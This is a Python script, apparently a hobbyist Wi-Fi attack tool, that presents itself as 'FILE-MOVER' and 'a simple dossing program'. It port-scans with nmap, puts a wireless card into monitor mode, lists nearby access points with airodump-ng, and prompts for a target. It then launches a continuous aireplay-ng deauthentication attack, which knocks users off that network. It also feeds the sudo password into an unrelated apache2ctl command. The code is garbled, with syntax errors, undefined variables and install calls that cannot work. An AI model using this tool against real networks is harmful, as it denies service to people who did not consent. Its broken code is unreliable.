import subprocess, re, csv, os, time, shutil, sys, getpass, traceback, platform, time, threading, pprint
import nmap, pathlib
from datetime import datetime
from subprocess import Popen, call, PIPE
import IPCHECKER as IPx
from tqdm import tqdm
from getpass import getpass
from os import devnull


class Spinner:
    busy = False
    delay = 0.1

    @staticmethod
    def spinning_cursor():
        while 1:
            for cursor in '|/-\\': yield cursor

    def __init__(self, delay=None):
        self.spinner_generator = self.spinning_cursor()
        if delay and float(delay): self.delay = delay

    def spinner_task(self):
        while self.busy:
            sys.stdout.write(next(self.spinner_generator))
            sys.stdout.flush()
            time.sleep(self.delay)
            sys.stdout.write('\b')
            sys.stdout.flush()

    def __enter__(self):
        self.busy = True
        threading.Thread(target=self.spinner_task).start()

    def __exit__(self, exception, value, tb):
        self.busy = False
        time.sleep(self.delay)
        if exception is not None:
            return False


class Colors:
    reset = "\033[0m"

    # Black
    fgBlack = "\033[30m"
    fgBrightBlack = "\033[30;1m"
    bgBlack = "\033[40m"
    bgBrightBlack = "\033[40;1m"

    # Red
    fgRed = "\033[31m"
    fgBrightRed = "\033[31;1m"
    bgRed = "\033[41m"
    bgBrightRed = "\033[41;1m"

    # Green
    fgGreen = "\033[32m"
    fgBrightGreen = "\033[32;1m"
    bgGreen = "\033[42m"
    bgBrightGreen = "\033[42;1m"

    # Yellow
    fgYellow = "\033[33m"
    fgBrightYellow = "\033[33;1m"
    bgYellow = "\033[43m"
    bgBrightYellow = "\033[43;1m"

    # Blue
    fgBlue = "\033[34m"
    fgBrightBlue = "\033[34;1m"
    bgBlue = "\033[44m"
    bgBrightBlue = "\033[44;1m"
    # Magenta
    fgMagenta = "\033[35m"
    fgBrightMagenta = "\033[35;1m"
    bgMagenta = "\033[45m"
    bgBrightMagenta = "\033[45;1m"
    # Cyan
    fgCyan = "\033[36m"
    fgBrightCyan = "\033[36;1m"
    bgCyan = "\033[46m"
    bgBrightCyan = "\033[46;1m"
    # White
    fgWhite = "\033[37m"
    fgBrightWhite = "\033[37;1m"
    bgWhite = "\033[47m"
    bgBrightWhite = "\033[47;1m"


###########
color = Colors()
spinner = Spinner()
yellow = color.fgYellow
red = color.fgRed
blue = color.fgBlue
bblue = color.fgBrightBlue
cyan = color.fgCyan
bg_background = color.bgBlack
reset = color.reset


############


def display_header():
    # print('*' * 75)
    color_red = Colors()
    global red0
    red0 = color_red.fgRed
    global reset0
    reset0 = color_red.reset

    x = 'x'
    print(f"{'X' * 125:^70}")
    print(f"{'X' * 125:^70}")
    pretty = f'{red0}xxx FILE-MOVER xxx{reset0}'.center(width)
    print(f'{pretty : ^70}')
    print(f"{'X' * 125: ^70}")

    one = (
        f'[USAGE] - [1] This is a simple dossing program.')
    two = (
        f'[USAGE] - [2] The program requires  Linux or MacoS {red} WE DO NOT TOLERATE WINDOWS {reset} \n[USAGE] - [2]*Dependencies will auto install')
    three = (
        f'[USAGE] - [3] The program works best with KALI-LINUX/UBUNTU. It will auto-find your NIC.')
    four = (f'[USAGE] - [4] Remember your NIC ID if {red} not on {reset} KALI-LINUX or UBUNTU')
    five = (
        f'[USAGE] - [5] Program will use ARP, NMAP and Wireshark.')
    six = (f'{yellow}**copyright material from Adel Al-Aali [SYSTEM]{reset}')

    print(f"{one:^70}")
    print(f"{two:^70}")
    print(f"{three:^70}")
    print(f"{four:^70}")
    print(f"{five:^70}")
    print(f"{six:^70}")
    print(f"{x * 20: ^70}")
    print()
    print()


def period_wait():
    period = ['.', '.', '.', '.', '.', '.', '.', '.', '.', '.']
    # multi = [2,2,2,2,2,2,2,2,2,2]
    period_len = len(period)
    with Spinner():
        for z, x in enumerate(period):
            print(x)
            time.sleep(.2)
            if z <= period_len:
                z += 1
                print(f"{yellow}{x * z}{reset}")
                continue
            elif z == period_len:
                break


def clear():
    # check and make call for specific operating system
    os_name = platform.system()
    _ = call('clear' if os_name == 'Linux' or 'Windows' or 'Darwin' else 'cls')


def install():
    try:
        sucessfull_install = []
        subprocess.check_call([sys.executable, "-m", "pip", "install", threading])
        if subprocess.check_call:
            print(f'{yellow} Sucessfully Installed PIP')
            sucessfull_install.append('pip')
        subprocess.check_call([sys.executable, "-m", "tqdm", "install", tqdm])
        if subprocess.check_call:
            print(f'{yellow} Sucessfully Installed TQDM')
            sucessfull_install.append('TQDM')
        subprocess.check_call([sys.executable, "-m", "pip", "datetime", datetime])
        if subprocess.check_call:
            print(f'{yellow} Sucessfully Installed datetime')
            sucessfull_install.append('datetime')
        subprocess.check_call([sys.executable, "-m", "pip", "net-tools", net - tools])
        if subprocess.check_call:
            print(f'{yellow} Sucessfully Installed datetime')
            sucessfull_install.append('net-tools')
        subprocess.check_call([sys.executable, "-m", "apt install", "airmon-ng", airmon - ng])
        if subprocess.check_call:
            print(f'{yellow} Sucessfully Installed airmon-ng')
            sucessfull_install.append('airmong-ng')
        print(f'{yellow}**Installed Dependencies {reset}\n{sucessfull_install}')

        subprocess.check_call([sys.executable, "-m", "apt install", "airmon-ng", python-nmap])
        if subprocess.check_call:
            print(f'{yellow} Sucessfully Installed python-nmap')
            sucessfull_install.append('python-nmap')

        print(f'{yellow}**Installed Dependencies {reset}\n{sucessfull_install}')

    except subprocess.CalledProcessError as sub0:
        traceback.print_exc()
        print(f'{red} SUBPROCESS CALL ERROR {reset}\n{str(sub0)}')
    except subprocess.TimeoutExpired as sub1:
        traceback.print_exc()
        print(f'{red} SUBPROCESS CALL ERROR {reset}\n{str(sub1)}')
    except subprocess.SubprocessError as sub2:
        traceback.print_exc()
        print(f'{red} SUBPROCESS CALL ERROR {reset}\n{str(sub2)}')

# python-nmap
    # Step 2: pip install python-nmap


def arp_scan():
    ip_add_pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    port_range_pattern = re.compile("([0-9]+)-([0-9]+)")
    port_min = 0
    port_max = 65535
    open_ports = []
    # Ask user to input the ip address they want to scan.
    while True:
        ip_add_entered = input("\nPlease enter the ip address that you want to scan: ")
        print(f"**{yellow}**Enter the IP address for scanning  {reset}\n ")
        port_range = input("* ")
        if ip_add_pattern.search(ip_add_entered):
            print(f"{ip_add_entered} is a valid ip address")
            break
    while True:
        print(f"**{yellow}**Enter the port range {reset}\n ")
        port_range = input("* ")
        port_range_valid = port_range_pattern.search(port_range.replace(" ", ""))
        if port_range_valid:
            port_min = int(port_range_valid.group(1))
            port_max = int(port_range_valid.group(2))
            break

    nm = nmap.PortScanner()
    for port in range(port_min, port_max + 1):
        try:
            result = nm.scan(ip_add_entered, str(port))
            print(result)
            port_status = (result['scan'][ip_add_entered]['tcp'][port]['state'])
            print(f"Port {port} is {port_status}")
        except:
            traceback.print_exc()
            print(f"{red}**ERROR IN NMAP SCAN{port}.")



ACTIVE_NETWORKS = []
# TO AVOID SSID DUPLICATIONS- #pass ssid % list
def check_wifi(ssid, list):
    check = True
    for item in list:
        if len(list) == 0:
            print(f'{yellow}**[PARSING] {item}')
            return check
        elif ssid in item['essid']:
            print(f'{yellow} ESSID FOUND')
            check_status = False
            return check
        return check

try:
    print(IPx.get_ip)
    # print(f'\033[0;35;47m \t\t[{IPx.get_ip()}]  ...? \033[0m 0;35;47m')
    width = os.get_terminal_size().columns  # set the width to center goods
    terminal = os.environ.get('TERM')
    width_len = width
    cwd = os.getcwd()
    #  IP_INFO = f"\033[1;35;0m {IPx.IP}"
    IP = IPx.get_ip

    current_version = platform.release()
    system_info = platform.platform()
    os_name0 = platform.system()

    ## new adds
    big_names = platform.uname()
    processor = platform.processor()
    architecture = platform.architecture()
    user_id = os.uname()
    login = os.getlogin()

    display_header()
    print(), print()
    print('X' * 150)
    print('X' * 150)
    print()
    print(f'SYSTEM INFO'.center(width))  ### IP_INFO Is disabled due to .API usage limit.
    print(f'\033[1;35;m [{current_version}]  ...? '.center(width))
    print(f'\033[1;35;m [{os_name0}] + [{terminal}] ...? '.center(width))
    print(f'\033[1;35;m [{system_info}]  ...? '.center(width))
    print(f'\033[1;35;0m [{current_version}]  ...? '.center(width))  ### ADDD YOUR IP
    print(f'\033[1;35;0m [{IP}]  ...? '.center(width))  ### ADDD YOUR IP
    print(f'\033[1;35;0m [{big_names}]  ...? '.center(width))  ### ADDD YOUR IP
    print(f'\033[1;35;0m [{processor}]  ...? '.center(width))  ### ADDD YOUR IP
    print(f'\033[1;35;0m [{architecture}]  ...? '.center(width))  ###
    print(f'\033[1;35;0m [{user_id}]  ...? '.center(width))  ###
    print(f'\033[1;35;0m [{login}]  ...? '.center(width))  ###
    print(f'\033[1;35;0m [{current_version}]  ...? '.center(width))  ### ADDD YOUR IP
    # print(f'\033[1;35;0m [{IP_INFO}]  ...? '.center(width))  ### ADDD YOUR IP

except Exception as E:
    traceback.print_exc()
    print(str(E))

current_platform = platform.system()
platform_name = sys.platform
while True:
    if 'Windows' in current_platform:
        print('X' * 50)
        print(f'{red} Your OS {current_platform} || {platform_name} sucks. \n**FUCK-WINDOWS-**{reset}')
        period_wait()
        sys.exit(1)
    else:
        print(f'{yellow}**Current Platform{reset}\n{current_platform}')
        break

try:  ## (try, except else)
    with Spinner():
        flag = True
        while flag:
            if not 'SUDO_UID' in os.environ.keys():
                print('x' * 50)
                print('[SYSTEM] Must have SU Privledges.')
                password = getpass('* ')
                print()
                proc = Popen('sudo -S apache2ctl restart'.split(), stdin=PIPE, stderr=PIPE)
                proc.communicate(password.encode())
                if proc.communicate:
                    print(f'**{yellow}Sudo Escalation Successful, moving on.. {reset}')
                    flag = False
                    break
                else:
                    print(f'**{red}Sudo Escalation failed, SYS.EXIT on.. {reset}')
                    print(f'**{yellow}Try again... {reset}')
                    continue
except Exception as EX:
    print(f'{red}IO ERROR - MUST BE SUPER USER()): {reset}  \n**{EX}')
    sys.exit(1)

else:
    print('X' * 50)
    try:  ## try, else except
        current_time = time.time()
        clock_time = time.ctime(current_time)
        print(f'{yellow}**Your OS {current_platform} || Platform {platform_name}  \n{clock_time}')
        if 'linux' in platform_name or 'Linux' in current_platform:
            print(f'{yellow}**Detected Linux, auto compliling IW-CONFIG. {reset}')
            interface_UBUNTU = re.compile(r"^wlo[0-9]")  ##### UBUNTU
            nic = interface_UBUNTU.findall(subprocess.run(['iwconfig'], capture_output=True).stdout.decode())
        else:
            print('X' * 50)
            flag00 = True
            while flag00:  #### ADD VARIOUS REGEXES FOR DIFFERENT OS
                interface_KALI = re.compile(r'^wlan[0-9]+')  ###### KALI LINUX
                possible_nic00 = interface_KALI.findall(
                    subprocess.run(['iwconfig'], capture_output=True).stdout.decode())
                interface_LINUX = re.compile(r'^wlo[0-9]+')  ##### UBUNTU
                possible_nic01 = interface_LINUX.findall(
                    subprocess.run(['iwconfig'], capture_output=True).stdout.decode())

                print(f'{yellow}**Could not auto detect Ubuntu/Kali. {reset}')
                print(f'{yellow}*{possible_nic00} || {possible_nic01}  {reset}')
                print(f'{yellow}**Please Enter Your NIC{reset}')
                nic = input('* ')
                if len(nic) == 0:
                    continue
                elif len(nic) != 0:
                    flag00 = False
                break

        print('X' * 50)
        print(f'{yellow}**Your OS {current_platform} || Platform {platform_name}  \n{clock_time}')
        print(f'{yellow} :: Your NIC {reset}\n{nic}')
        nic = str(nic)
        nic = nic.replace("[", "")
        nic = nic.replace("]", "")
        nic = nic.replace("'", "")
        print('String Nic,', nic)
        print(), print()
    except EOFError as EOF:
        traceback.print_exc()
        print(str(EOF))
        print(f'{red}**Error, must have input{reset}')
    except Exception as e:
        traceback.print_exc()
        print(str(e))
        sys.exit(1)

## ################################################################ ##
## ################################################################ ##
## ################################################################ ##

try:
    with Spinner():
        arp_scan()
        cwd = os.getcwd()
        for f in os.listdir(cwd):
            if 'attack.csv' in f:
                print('x' * 50)
                current_files = subprocess.run(['ls', '-la'], capture_output=True, text=True)  ## .stdout.decode())
                #  print(f'[SYSTEM] {current_files}')
                print(f'{yellow} :: Current Files in Directory ::{reset}\n {current_files}')
                # to get current directory
                directory = os.getcwd()
                backup = pathlib.PurePath('/backup/')
                if backup not in os.walk(directory):
                    try:
                        print('X' * 50)
                        os.mkdir(directory + "/backup/")
                        timestamp = datetime.now()
                        shutil.move(f, directory + "/backup/" + str(timestamp) + '-' + f)
                        print(f'**{yellow}**Created backup file in:{reset} \n[{directory + backup}]')
                        break
                    except:
                        print(f'{red}**Folder already exists{reset}')
                        break
                else:
                    print(f'**{red}.csv found in directory. moving it to backup folder. {reset}')
                    break
except IOError as e:
    traceback.print_exc()
    print(f'{red}IO ERROR in parsing listdir()): {reset}', e)

############################################################################### ##
############################################################################### ##
## ADD LOGIC TO DETERMIN KALI / UBUNTU USING PLATFORM ##

else:
    try:
        run_discovery = True
        while run_discovery:
            subprocess.call('clear', shell=True)
            for file_name in os.listdir(cwd):
                if 'attack.csv' in file_name:
                    print(f'{yellow}**Found attack.csv in{reset}\n {cwd}')
                else:
                    print(f'{red}**Did not find a directory, searching for one.. {reset}')
                    csv_loc = directory + 'attack.csv'
                    print(f'{yellow}**The .csv was created xwerghmn  '
                          f' in: {reset} \n*{csv_loc}')
                    file = open(csv_loc, 'a')
                    if file:
                        print(f'{yellow}**Created attack.csv in:{reset} \n {csv_loc}')
                        time.sleep(1)
                        break
    except Exception as e:
        traceback.print_exc()
        print(f'{red}**Error, must have input{reset}')
        print(str(e))
    else:
        display_header()
        period_wait()
        params = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher',
                  'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'key']
        print(f'{yellow} :: LIST PARAMS :: {reset} \n{params}')
        print(f'{yellow} :: Your NIC :: {reset}\n {nic}')
        print(f'{yellow} {type(nic)} {reset}'), print()
        print('X' * 50)
        print(f'**{yellow}**Wifi adapter now connected, staring processes.{reset}')
        #### DISPLAY CONFLICTING PROCESSES
        ### KILL IWCONFIG
        ## KILL ADDITIONAL PROCESSES
        # PUT NIC INTO MONITOR
        # BRING CONTROLER BACK ONLINE #
        ########### START##################

        with Spinner():
            ####### DISPLAY CONFLICTING SUBPROCESSES #########
            display_conflict = subprocess.run(['sudo', 'airmon-ng', 'check'])
            if display_conflict:
                print(f'{yellow} :: Conflicting Subprocesses :: {reset}')
                print(display_conflict)
                time.sleep(3)
            else:
                print(f'{red} :: No conflicting subprocesses :: {reset}')

            ## KILL IWCONFIG ###
            kill_iw = subprocess.run(['sudo', 'link', 'set', nic, 'down'])
            if kill_iw:
                print(f'{yellow} :: Killing IW :: {reset}')
                print(kill_iw)
                time.sleep(3)

            ############# KILL PROCESS ###################
            kill_process = subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'])
            if kill_process:
                print(f'{yellow} :: Killing System Processes ::')
                print(kill_process)
              #  run_discovery = False
               # break
            else:
                print(f'{red}**No subprocess to kill{reset}')
                #run_discovery = False
                # break

            ############ START MONITORING MODE ##############
            monitored_mode = subprocess.run(["iw",nic , "set", "monitor", "none"])
            if monitored_mode:
                print(f'{yellow} :: Killing System Processes ::')
                print(monitored_mode)
              #  run_discovery = False
               # break
            else:
                print(f'{red}**Monitor Mode Failed**{reset}')


            # Bring the WiFi controller back online.
            iw_up = subprocess.run(["ip", "link", "set", nic, "up"])
            if iw_up:
                print(f'{yellow} :: Turning On The Interface ::')
                print(iw_up)
              #  run_discovery = False
               # break
            else:
                print(f'{red}*ERROR IN BRINGING INTERFACE BACK UP**{reset}')

            #
            # start = subprocess.run(['sudo', 'airdump-ng', 'start', nic])
            # if start:
            #     print(f'**{yellow}**[Succesfully Started Airmon-NG]** {reset}')
            #     print(start)
            # else:
            #     print(f'{red}**monitored mode failed{reset}')

            ######### START SEQUENCE FOR DISCOVER AP #######

            discover_ap = subprocess.Popen(
                ['sudo', 'airodump-ng', '-w', 'attack', '--write-interval', '1', '--output-format', 'csv',
                 nic + 'mon'], stdout=PIPE, stderr=PIPE, stdin=PIPE)
            if discover_ap:
                print(f'**{yellow}**[DISCOVERED AP]** {reset}')

            for file in os.listdir(cwd):
                if "attack.csv" not in file:
                    print(f'{red}** Did not find a directory, searching for one.. {reset}')
                    csv_loc = directory + 'attack.csv'
                    print(f'{yellow}**The .csv is in: {reset} \n*{csv_loc}')
                    file = open(csv_loc, 'w')
                    if file:
                        print(f'{yellow}**Created attack.csv in:{reset} \n {csv_loc}')
                        time.sleep(1)
                        break
                     elif 'attack.csv' in file:
                        print(f'{yellow}**.CSV already exists, moving on.. {reset}')

            with 'attack.csv' in os.listdir(cwd) as csv_h:
                for index, result in enumerate(nic):
                    print(f'{bblue}{index} || {result}{reset}')
                   # with open('attack.csv') as csv_h:
                    csv_h.seek(0)
                    csv_reader = csv.DictReader(csv_h, field_names=params)
                    for row in csv_reader:
                        if row['BSSID'] == 'BSSID':  # skip bssid, its already listed.
                            print(f'{yellow} found [BSID] in: {reset}\n {ACTIVE_NETWORKS}\n{row}')
                            ACTIVE_NETWORKS.append(row)
                        elif row in ['BSSID'] == 'Station MAC':  ## GETS RID OF CLIENT DATA.
                            print(
                                f'{yellow} found [BSID] (MACHINE-MAC) in: {reset}\n {ACTIVE_NETWORKS}\n{row}')
                            ACTIVE_NETWORKS.append(row)
                            break
                        elif check_wifi(row['ESSID'], ACTIVE_NETWORKS):
                            print(f'{yellow} found ESSID in: {reset}\n {ACTIVE_NETWORKS}\n{row}')
                            ACTIVE_NETWORKS.append(row)
                        elif check_wifi(row['SSID'], ACTIVE_NETWORKS):
                            print(f'{yellow} found SSID in: {reset}\n {ACTIVE_NETWORKS}\n{row}')
                            ACTIVE_NETWORKS.append(row)
                        elif check_wifi(row['LAN_IP'], ACTIVE_NETWORKS):
                            print(f'{yellow} found LAN_IP in: {reset}\n {ACTIVE_NETWORKS}\n{row}')
                            ACTIVE_NETWORKS.append(row)
                    print()
                    print('X' * 50)
                    print(
                        f'**{yellow}Scanning. Press control+ when you want to select the network you want to attack.{reset}\n')
                    print("No |\tBSSID              |\tChannel|\tESSID                         |")
                    print("___|\t___________________|\t_______|\t______________________________|")
                    print(f'{yellow}**[ACTIVE_NETWORKS]{reset}\n{red}{ACTIVE_NETWORKS}{reset}')

                    try:
                        for index, item in enumerate(ACTIVE_NETWORKS):
                            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
                            active_network = True
                            while active_network:
                                if KeyboardInterrupt:
                                    print()
                                    print('X' * 50)
                                    print(f'\n{red}[SYSTEM] USER EXIT.{reset}')
                                    traceback.print_exc()
                                    active_network = False
                                    choice = input("[SYSTEM] Please make a choice from above. ")
                                    try:
                                        if ACTIVE_NETWORKS[int(choice)]:
                                            hack_ssid = ACTIVE_NETWORKS[int(choice)]["BSSID"]
                                            hack_channel = ACTIVE_NETWORKS[int(choice)]["channel"].strip()
                                            subprocess.run(["airmon-ng", "start", nic + "mon", hack_channel])
                                            subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hack_ssid,
                                                            wifi_result[int(wifi_interface_choice)] + "mon"])
                                            time.sleep(1)
                                            continue
                                    except Exception as error:
                                        traceback.print_exc()
                                        print(f'{red}** ERROR IN ACTIVE_NETWORK PARSING \n{str(error)}{reset}')

                    except Exception as error:
                        traceback.print_exc()
                        print(f'{red}**{str(error)}{reset}')

                    except KeyboardInterrupt:  ### keyboard interupt --> disable monitormode
                        print('X' * 50)
                        print(f'\n{red}[SYSTEM] USER EXIT.{reset}')
                        traceback.print_exc()
                        pprint.pprint(ACTIVE_NETWORKS)
                        ## DISABLE MONITORED MODE
                        print(f'**{yellow}**[Killing Monitoring Process]** {reset}')
                        disable_monitor = subprocess.run(['sudo', 'airmon-ng', 'stop', nic])
                        if disable_monitor:
                            print(f'{red}**Successfully Killed Monitoring Process{reset}')
                            print(f'{red}*Breaking Loop{reset}')
                            #print(f'{red}*Choose your target{red}')
                            run_discovery = False
                            print('X' * 50)


try:
    print('X'*50)
    arp_scan()
    pprint.pprint(ACTIVE_NETWORKS)
    print(f'{yellow}**[ACTIVE_NETWORKS]\n{ACTIVE_NETWORKS}')
    print('X'*50)
    while True:
        print(f'{yellow}**[Choose Your Target]\n{ACTIVE_NETWORKS}')
        victim = input('*')
        if victim:
            break
    target_ssid = ACTIVE_NETWORKS[int(victim)]['BSSID']
    target_channel = ACTIVE_NETWORKS[int(victim)]['channel'].strip()
    print('X'*50)
    pprint.pprint(ACTIVE_NETWORKS)
    print(f'{yellow}**[ACTIVE_NETWORKS]\n{ACTIVE_NETWORKS}')
    pprint.pprint(target_ssid)
    print(f'{yellow}**[TARGET_SSID]\n{target_ssid}')
    pprint.pprint(target_ssid)
    print(f'{yellow}**[TARGET_CHANNEL]\n{target_channel}')
    print('X'*50)
except EOFError as EOF:
    print('X'*50)
    traceback.print_exc()
    print(str(EOF))
    print(f'{red}**Error, must have input{reset}')
except Exception as e:
    print('X'*50)
    traceback.print_exc()
    print(str(e))

## start attack using channel
try:
    print('X' * 50)
    subprocess.run(['airmon-ng', 'start', nic , target_channel])
    subprocess.run(['aireplay-ng', '--deauth', '0', '-a', target_ssid, target_channel])

except KeyboardInterrupt:  ### keyboard interupt --> disable monitormode
    print('X' * 50)
    print(f'\n{red}[SYSTEM] USER EXIT.{reset}')
    traceback.print_exc()
    pprint.pprint(ACTIVE_NETWORKS)
    ## DISABLE MONITORED MODE
    print(f'**{yellow}**[Killing Monitoring Process]** {reset}')
    disable_monitor = subprocess.run(['sudo', 'airmon-ng', 'stop', nic])
    if disable_monitor:
        print(f'{red}**Successfully Killed Monitoring Process{reset}')
        print(f'{red}*Breaking Loop{reset}')
        # print(f'{red}*Choose your target{red}')
        run_discovery = False
        print('X' * 50)

except Exception as final_error:
        traceback.print_exc()
        print(f'{red}**{str(final_error)}**{reset}')

#